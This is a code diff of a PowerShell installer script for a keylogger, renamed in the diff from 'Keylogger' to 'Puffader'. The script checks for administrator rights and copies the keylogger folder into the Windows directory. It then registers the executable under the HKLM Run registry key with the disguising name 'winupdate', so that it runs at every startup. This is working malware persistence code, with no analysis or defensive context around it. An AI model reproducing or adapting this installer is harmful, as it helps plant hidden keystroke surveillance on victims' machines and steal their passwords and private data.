@@ -2,8 +2,7 @@
 # You will also need to compile file as .exe
 
 # Set the compiled folder name
-$strFileDir = "Keylogger"
-
+$strFileDir = "Puffader"
 
 If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {
@@ -22,8 +21,11 @@ If (test-path "$WINDIR\$strFileDir") {exit}
 Copy-Item -Path $strFileDir -Destination $WINDIR -Recurse -Force
 
 # get path of executable
-$strFileName  = get-childitem -Filter *.exe $WINDIR\$strFileDir
-$strFilePath = $strFileName.FullName
+Get-ChildItem -Filter *.exe $WINDIR\$strFileDir | ForEach {
+    If (Compare-Object $_.Name "w9xpopen.exe") {
+    $strFilePath = $_.FullName
+    }
+}
 
 # make program run at startup
 New-ItemProperty -path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -name winupdate -PropertyType String -value "$strFilePath" -Force
